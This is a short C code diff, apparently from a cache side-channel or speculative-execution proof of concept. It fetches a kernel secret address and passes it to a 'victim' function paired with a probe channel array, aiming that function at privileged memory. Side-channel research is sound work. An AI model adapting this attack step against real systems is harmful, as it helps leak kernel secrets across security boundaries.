@@ -114,6 +114,8 @@ main(int argc, char *argv[])
     return 1;
   }
 
+  u64 ksecret = get_secret_addr();
+
   auto uv = ((int (*)(u8*, u64, int)) uva);
 
   //set_safe_addr(ksa);
@@ -168,7 +170,8 @@ main(int argc, char *argv[])
     */
 
     // call victim
-    junk ^= victim(channel, 42, 0);
+    //junk ^= victim(channel, 42, 0);
+    junk ^= victim(channel, (u8 *)ksecret, 0);
     //printf("incorrect elapsed: %lu\n", elapsed);
 
     //junk ^= channel[250 * GAP];
